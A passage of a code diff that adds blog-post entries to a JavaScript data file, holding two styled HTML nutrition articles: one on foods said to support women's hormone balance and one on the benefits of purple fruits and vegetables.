+                excerpt: "Hormones influence nearly every aspect of a woman's health, from energy levels and metabolism to mood, sleep quality, skin health, reproductive wellness, and overall vitality. While hormone fluctuations are a natural part of life, the foods you eat each day can play a significant role in supporting your body's ability to maintain balance.",
+                content : `
+                <p>Hormones influence nearly every aspect of a woman's health, from energy levels and metabolism to mood, sleep quality, skin health, reproductive wellness, and overall vitality. While hormone fluctuations are a natural part of life, the foods you eat each day can play a significant role in supporting your body's ability to maintain balance.</p>
+
+<p>A nutrient-rich diet filled with whole foods provides the building blocks needed for hormone production, regulation, and metabolism. Certain foods are especially valued for their ability to provide healthy fats, fiber, antioxidants, vitamins, and minerals that support hormonal wellness. Combined with healthy lifestyle habits, these nutritional choices can help women feel their best throughout every stage of life.</p>
+
+<p>If you're looking to support hormone balance naturally, incorporating the right foods into your meals can be a powerful first step. From leafy greens and omega-3-rich salmon to antioxidant-packed berries and fiber-rich flaxseeds, let's explore some of the most beneficial foods for women's hormonal health.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Hormone-friendly foods often contain healthy fats, fiber, antioxidants, and essential minerals.</li>
+    <li>Balanced nutrition supports healthy hormone production and metabolism.</li>
+    <li>Whole foods can help support stable energy, mood, and overall wellness.</li>
+    <li>Fiber-rich foods play an important role in maintaining hormonal balance.</li>
+    <li>Lifestyle habits such as sleep, hydration, and stress management are equally important.</li>
+    <li>Small daily nutrition choices can contribute to long-term hormonal health.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Understanding the Connection Between Nutrition and Hormones</h2>
+
+<p>Hormones act as chemical messengers that help regulate numerous bodily functions. They influence metabolism, appetite, reproductive health, sleep cycles, stress responses, and emotional well-being. Because hormones are involved in so many systems, even small imbalances can affect how you feel day to day.</p>
+
+<p>Nutrition provides many of the nutrients required for hormone production and regulation. Healthy fats contribute to hormone synthesis, while fiber supports normal digestion and hormone metabolism. Vitamins, minerals, and antioxidants help support the body's complex regulatory processes.</p>
+
+<p>Rather than relying on quick fixes, a consistent focus on nutrient-dense foods can create a strong foundation for long-term hormonal wellness.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Hormone balance is rarely influenced by a single food. Sustainable improvements are often the result of consistent healthy eating patterns, quality sleep, stress management, hydration, and regular physical activity working together.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Flaxseeds: A Fiber-Rich Hormone Support Food</h2>
+
+<p>Flaxseeds are among the most frequently recommended foods for women's wellness. These tiny seeds are packed with fiber and beneficial plant compounds that make them a valuable addition to a balanced diet.</p>
+
+<p>Fiber supports digestive health and may assist the body's natural hormone metabolism processes. Flaxseeds are also versatile and easy to incorporate into everyday meals.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Simple Ways to Use Flaxseeds</h3>
+
+<ul>
+<li>Mix into smoothies.</li>
+<li>Sprinkle over yogurt.</li>
+<li>Add to oatmeal.</li>
+<li>Blend into homemade energy bites.</li>
+<li>Use in baking recipes.</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Leafy Greens and Hormonal Wellness</h2>
+
+<p>Leafy greens such as spinach, kale, arugula, and Swiss chard provide a wide variety of nutrients that support overall health. They are rich in vitamins, minerals, antioxidants, and fiber.</p>
+
+<p>Many wellness experts encourage increasing vegetable intake because nutrient-dense greens support multiple bodily systems at once. Their low calorie density and high nutritional value make them an excellent choice for daily meals.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Best Ways to Enjoy Leafy Greens</h4>
+
+<ul>
+<li>Fresh salads.</li>
+<li>Green smoothies.</li>
+<li>Vegetable soups.</li>
+<li>Stir-fries.</li>
+<li>Whole grain wraps.</li>
+</ul>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Fiber-rich vegetables support digestive health.</li>
+    <li>Colorful produce provides beneficial antioxidants.</li>
+    <li>A variety of vegetables helps maximize nutrient intake.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Avocados and Healthy Hormone-Supporting Fats</h2>
+
+<p>Healthy fats are essential for many bodily functions, including hormone production. Avocados are a popular source of heart-friendly fats and provide a creamy texture that works well in countless recipes.</p>
+
+<p>In addition to healthy fats, avocados contain fiber and various vitamins and minerals. They can help create satisfying meals that support steady energy levels throughout the day.</p>
+
+<p>Try adding avocado to salads, sandwiches, grain bowls, or smoothies for a nutrient-rich boost.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Nuts and Seeds for Essential Nutrients</h2>
+
+<p>Nuts and seeds provide a powerful combination of protein, healthy fats, fiber, and minerals. Almonds, walnuts, pumpkin seeds, sunflower seeds, and chia seeds are commonly included in hormone-supportive meal plans.</p>
+
+<p>These foods contain nutrients such as zinc, selenium, vitamin E, and magnesium, all of which contribute to overall wellness and healthy body function.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Keep a small container of mixed nuts and seeds available for convenient snacking. This simple habit can help reduce reliance on highly processed foods while increasing nutrient intake.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Salmon and Omega-3 Fatty Acids</h2>
+
+<p>Salmon is widely known for its omega-3 fatty acids. These healthy fats are associated with supporting a healthy inflammatory response and overall wellness.</p>
+
+<p>Including salmon as part of a balanced diet may help support numerous aspects of health, including cardiovascular wellness and healthy hormone function. It also provides high-quality protein and important nutrients.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Healthy Serving Ideas</h3>
+
+<ul>
+<li>Grilled salmon with vegetables.</li>
+<li>Salmon grain bowls.</li>
+<li>Salmon salads.</li>
+<li>Baked salmon with herbs and lemon.</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Sweet Potatoes for Energy and Nutrient Support</h2>
+
+<p>Sweet potatoes provide complex carbohydrates, fiber, and valuable nutrients. They are often favored by people looking to maintain consistent energy levels throughout the day.</p>
+
+<p>Unlike highly processed snacks that may contribute to rapid blood sugar fluctuations, nutrient-dense carbohydrates can support a more balanced approach to eating.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Berries and Antioxidant Protection</h2>
+
+<p>Berries are among the most nutrient-rich fruits available. Blueberries, strawberries, raspberries, and blackberries contain antioxidants that help support overall wellness.</p>
+
+<p>Their natural sweetness makes them a delicious alternative to heavily processed desserts while still providing beneficial nutrients and fiber.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Easy Berry Ideas</h4>
+
+<ul>
+<li>Add to smoothies.</li>
+<li>Mix into yogurt bowls.</li>
+<li>Top oatmeal with fresh berries.</li>
+<li>Create fruit salads.</li>
+<li>Blend into homemade frozen treats.</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Cruciferous Vegetables and Hormone Metabolism</h2>
+
+<p>Cruciferous vegetables include broccoli, cauliflower, Brussels sprouts, and cabbage. These vegetables are frequently discussed in conversations about hormone-supportive nutrition because of their unique nutrient profile.</p>
+
+<p>Adding a variety of cruciferous vegetables to weekly meals is a practical way to increase fiber and micronutrient intake while supporting overall health goals.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Variety matters. No single vegetable or superfood can provide everything your body needs. Consuming a diverse range of colorful fruits and vegetables helps create a more complete nutritional foundation.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Green Tea for Daily Wellness</h2>
+
+<p>Green tea is a popular beverage known for its antioxidant content. Many people enjoy it as part of a healthy lifestyle because it offers a refreshing alternative to sugary drinks.</p>
+
+<p>When combined with balanced nutrition and healthy habits, green tea can be a simple addition to a hormone-supportive wellness routine.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Chickpeas: Protein and Fiber in One Package</h2>
+
+<p>Chickpeas are an excellent plant-based food that provides both protein and fiber. These nutrients help create satisfying meals that can support stable energy levels throughout the day.</p>
+
+<p>Chickpeas are incredibly versatile and can be used in salads, soups, grain bowls, and homemade spreads.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Turmeric and Anti-Inflammatory Nutrition</h2>
+
+<p>Turmeric has become one of the most popular spices in wellness-focused nutrition. Its vibrant golden color and long history of culinary use have made it a staple in many kitchens.</p>
+
+<p>Whether added to soups, curries, roasted vegetables, or warm beverages, turmeric offers a flavorful way to diversify your diet.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Dark Chocolate: A Smart Treat for Hormonal Wellness</h2>
+
+<p>Dark chocolate provides a more nutrient-rich option compared to many highly processed sweets. It contains minerals and beneficial plant compounds that contribute to its popularity among health-conscious individuals.</p>
+
+<p>Enjoyed in moderation, dark chocolate can satisfy cravings while fitting into a balanced approach to nutrition.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Choose dark chocolate with a higher cocoa content for a richer flavor and a greater concentration of naturally occurring cocoa compounds.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Lifestyle Habits That Support Hormone Balance</h2>
+
+<p>Nutrition is only one piece of the puzzle. Healthy daily habits can significantly influence overall hormonal wellness.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Essential Daily Habits</h3>
+
+<ul>
+<li>Drink enough water throughout the day.</li>
+<li>Prioritize quality sleep.</li>
+<li>Manage stress effectively.</li>
+<li>Stay physically active.</li>
+<li>Focus on whole, minimally processed foods.</li>
+</ul>
+
+<p>When these habits are combined with nutrient-rich foods, they create a strong foundation for supporting long-term health and wellness.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Points</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Healthy fats help support hormone production.</li>
+    <li>Fiber-rich foods support hormone metabolism.</li>
+    <li>Antioxidants contribute to overall wellness.</li>
+    <li>Sleep and stress management are essential.</li>
+    <li>Consistency delivers the greatest results.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>Hormonal health is influenced by many factors, but nutrition remains one of the most powerful tools available for supporting balance and overall well-being. Foods such as flaxseeds, leafy greens, avocados, nuts and seeds, salmon, sweet potatoes, berries, cruciferous vegetables, green tea, chickpeas, turmeric, and dark chocolate provide a wide range of nutrients that can complement a healthy lifestyle.</p>
+
+<p>Rather than searching for a single miracle food, focus on building a consistent pattern of whole-food nutrition supported by quality sleep, regular movement, stress management, and proper hydration. Small daily choices can add up over time, helping you feel energized, resilient, and supported throughout every stage of life.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Hormone Balancing Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Women's Health</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Hormone Wellness</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Nutrition</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Whole Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Balanced Lifestyle</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Women's Wellness</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Hormones</span>
+</div>
+
+                `         
+            },
+            {
+                id: 'third-recipe-account',
+                title: 'Purple Foods For Health',
+                date: 'April 28, 2026',
+                image: './assets/Purple Foods For Health.png',
+                excerpt: '',
+                content : `
+                <p>Purple fruits and vegetables have earned a special place in the world of nutrition thanks to their vibrant color, rich antioxidant content, and impressive range of potential health benefits. From juicy blueberries and grapes to nutrient-packed purple cabbage, eggplant, and cauliflower, these colorful foods bring more to the table than visual appeal. Their deep shades are often linked to plant compounds that support overall wellness, making purple produce a smart addition to a balanced diet.</p>
+
+<p>Adding a variety of purple foods to your meals can help diversify your nutrient intake while making everyday eating more exciting. These naturally colorful ingredients are packed with vitamins, minerals, fiber, and protective plant compounds that contribute to heart health, healthy aging, and overall vitality. Whether blended into smoothies, tossed into salads, roasted as side dishes, or enjoyed as snacks, purple foods offer countless ways to elevate your nutrition.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Purple foods are rich in antioxidants and beneficial plant compounds.</li>
+    <li>Many purple fruits and vegetables support heart and immune health.</li>
+    <li>These foods often contain fiber, vitamins, and minerals that promote wellness.</li>
+    <li>Including a variety of purple produce can improve dietary diversity.</li>
+    <li>Purple vegetables and fruits can be easily incorporated into everyday meals.</li>
+    <li>Their vibrant color is often linked to compounds associated with healthy aging.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">What Makes Purple Foods So Unique?</h2>
+
+<p>The striking purple color found in many fruits and vegetables comes from naturally occurring pigments known as anthocyanins. These compounds belong to a broader group of plant nutrients called flavonoids. Anthocyanins not only provide brilliant shades of purple, blue, and red, but they are also widely recognized for their antioxidant properties.</p>
+
+<p>Antioxidants help protect cells from oxidative stress caused by free radicals. While oxidative stress is a normal part of life, excessive levels may contribute to various health challenges over time. Consuming antioxidant-rich foods is one way to support the body's natural defense systems.</p>
+
+<p>In addition to anthocyanins, many purple foods contain vitamin C, vitamin K, potassium, manganese, fiber, and other beneficial nutrients that contribute to overall health.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> The value of purple foods goes beyond a single nutrient. Their combination of antioxidants, fiber, vitamins, and minerals creates a powerful nutritional package that supports multiple areas of health simultaneously.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Popular Purple Fruits and Their Benefits</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Blueberries</h3>
+
+<p>Blueberries are among the most popular antioxidant-rich fruits available. Despite their name, many varieties display deep blue-purple hues. They are commonly associated with healthy aging, cognitive wellness, and cardiovascular support.</p>
+
+<p>These berries are also a good source of fiber and vitamin C. Their naturally sweet flavor makes them easy to enjoy in smoothies, yogurt bowls, oatmeal, and baked goods.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Purple Grapes</h3>
+
+<p>Purple grapes contain a range of beneficial compounds, including anthocyanins and other polyphenols. They are often celebrated for their role in supporting heart health and providing antioxidant protection.</p>
+
+<p>Fresh grapes make an excellent snack, while frozen grapes offer a refreshing alternative during warmer months. They can also be added to salads for natural sweetness and texture.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Blackberries</h3>
+
+<p>Blackberries are rich in fiber, vitamin C, and antioxidants. Their deep purple-black appearance signals a high concentration of plant compounds that contribute to their nutritional value.</p>
+
+<p>Regularly including blackberries in meals may help support digestive wellness due to their impressive fiber content.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Figs and Elderberries</h3>
+
+<p>Figs provide fiber, minerals, and natural sweetness. They can be enjoyed fresh or dried and pair beautifully with savory dishes.</p>
+
+<p>Elderberries have long been appreciated in traditional food cultures and are commonly used in syrups, teas, and preserves. Their rich color reflects their abundance of beneficial plant compounds.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Nutrient-Dense Purple Vegetables Worth Adding to Your Diet</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Purple Cabbage</h3>
+
+<p>Purple cabbage stands out for its beautiful color and impressive nutrient profile. It contains fiber, vitamin C, vitamin K, and powerful antioxidants.</p>
+
+<p>Compared to many other vegetables, purple cabbage is affordable, versatile, and easy to incorporate into meals. It can be shredded into slaws, added to salads, stir-fried, or roasted.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Simple Ways to Use Purple Cabbage</h4>
+
+<ul>
+<li>Add to tacos for crunch and color.</li>
+<li>Mix into grain bowls.</li>
+<li>Create a colorful coleslaw.</li>
+<li>Include in vegetable soups.</li>
+<li>Roast with olive oil and herbs.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Eggplant</h3>
+
+<p>Eggplant is a versatile vegetable known for its glossy purple skin and tender texture. It provides fiber and a variety of beneficial plant compounds.</p>
+
+<p>Popular in cuisines around the world, eggplant can be grilled, roasted, baked, stuffed, or blended into dips. Its ability to absorb flavors makes it an excellent ingredient for countless recipes.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Roasting eggplant with olive oil and garlic enhances its natural sweetness while creating a rich, satisfying texture that works well in both vegetarian and traditional dishes.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Purple Cauliflower</h3>
+
+<p>Purple cauliflower offers a colorful twist on a familiar favorite. It contains many of the same nutrients as traditional cauliflower while adding anthocyanins responsible for its vibrant appearance.</p>
+
+<p>This vegetable can be roasted, steamed, mashed, or transformed into cauliflower rice for creative meal options.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Purple Onions</h3>
+
+<p>Purple onions contribute flavor, color, and valuable plant compounds. Their sharp taste becomes sweeter when cooked, making them suitable for both raw and cooked dishes.</p>
+
+<p>From salads and sandwiches to soups and roasted vegetable medleys, purple onions provide versatility and visual appeal.</p>
+
+<div style="background:#f5f3ff;border:1px solid #ddd6fe;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #8b5cf6;">Why This Matters</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Eating colorful produce encourages a wider range of nutrients.</li>
+    <li>Purple foods contribute antioxidants that complement other fruits and vegetables.</li>
+    <li>Greater dietary variety often supports long-term healthy eating habits.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Potential Health Benefits of Purple Foods</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Supporting Heart Health</h3>
+
+<p>Many purple fruits and vegetables contain nutrients and plant compounds associated with cardiovascular wellness. Fiber helps support healthy cholesterol levels, while antioxidants contribute to overall circulatory health.</p>
+
+<p>Foods such as blueberries, grapes, purple cabbage, and purple onions are commonly included in heart-conscious eating patterns.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Promoting Healthy Digestion</h3>
+
+<p>Fiber is essential for digestive health, and many purple foods provide generous amounts of it. Blackberries, figs, cabbage, and eggplant are excellent examples.</p>
+
+<p>Fiber supports digestive regularity and contributes to feelings of fullness, making it a valuable component of balanced nutrition.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Helping Combat Oxidative Stress</h3>
+
+<p>Anthocyanins are among the most researched antioxidant compounds found in foods. Their presence in purple produce contributes to the impressive nutritional reputation of these fruits and vegetables.</p>
+
+<p>Including a range of antioxidant-rich foods may help support the body's natural defenses against everyday environmental stressors.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> No single food can guarantee perfect health. The greatest benefits come from consistently eating a wide variety of colorful fruits, vegetables, whole grains, lean proteins, and healthy fats.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Supporting Healthy Aging</h3>
+
+<p>The antioxidant content of purple foods has made them a popular topic in healthy aging discussions. While aging is a natural process, nutrient-dense foods help provide the body with resources needed for long-term wellness.</p>
+
+<p>Combining purple produce with other colorful fruits and vegetables creates a diverse nutritional foundation that supports overall health.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Add More Purple Foods to Your Daily Meals</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Breakfast Ideas</h3>
+
+<ul>
+<li>Top oatmeal with blueberries and blackberries.</li>
+<li>Blend purple berries into smoothies.</li>
+<li>Add grapes to yogurt parfaits.</li>
+<li>Include figs alongside breakfast bowls.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Lunch and Dinner Inspiration</h3>
+
+<ul>
+<li>Create colorful salads with purple cabbage and onions.</li>
+<li>Roast purple cauliflower as a side dish.</li>
+<li>Prepare grilled eggplant for wraps and sandwiches.</li>
+<li>Add grapes and berries to leafy green salads.</li>
+<li>Use purple vegetables in grain bowls.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Healthy Snack Options</h3>
+
+<ul>
+<li>Fresh grapes.</li>
+<li>Blueberries and blackberries.</li>
+<li>Sliced figs.</li>
+<li>Homemade berry parfaits.</li>
+<li>Frozen grapes for a refreshing treat.</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Building a Colorful Plate for Better Nutrition</h2>
+
+<p>Nutrition experts often encourage people to eat a rainbow of fruits and vegetables. Each color group tends to contain unique nutrients and plant compounds. Purple foods are one important part of that spectrum.</p>
+
+<p>When combined with red tomatoes, orange sweet potatoes, yellow peppers, green leafy vegetables, and white vegetables such as garlic and onions, purple produce contributes to a more diverse and nutrient-rich eating pattern.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Aim to include at least one naturally purple fruit or vegetable several times each week. Small, consistent habits often have a greater impact than occasional large changes.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Purple foods are rich in antioxidants and plant compounds.</li>
+    <li>Blueberries, grapes, cabbage, eggplant, and purple cauliflower are standout choices.</li>
+    <li>Many purple foods provide fiber, vitamins, and minerals.</li>
+    <li>Adding colorful produce supports dietary variety.</li>
+    <li>Purple ingredients can be enjoyed in meals, snacks, and beverages.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>Purple foods bring together exceptional nutrition, eye-catching color, and culinary versatility. From antioxidant-rich blueberries and grapes to fiber-filled cabbage, eggplant, onions, and cauliflower, these vibrant ingredients offer a delicious way to enhance everyday meals.</p>
+
+<p>While no single food determines health outcomes, consistently including a variety of colorful fruits and vegetables can support a balanced lifestyle. Purple produce stands out as an easy and enjoyable way to increase nutrient intake while adding flavor, texture, and visual appeal to your plate.</p>
+
+<p>Whether you are looking to improve dietary variety, enjoy more plant-based foods, or simply explore new ingredients, purple fruits and vegetables deserve a place in your kitchen. Their nutritional value, versatility, and natural beauty make them a smart choice for anyone seeking a healthier and more colorful approach to eating.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Purple Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Antioxidant Rich Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Eating</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Purple Vegetables</span>
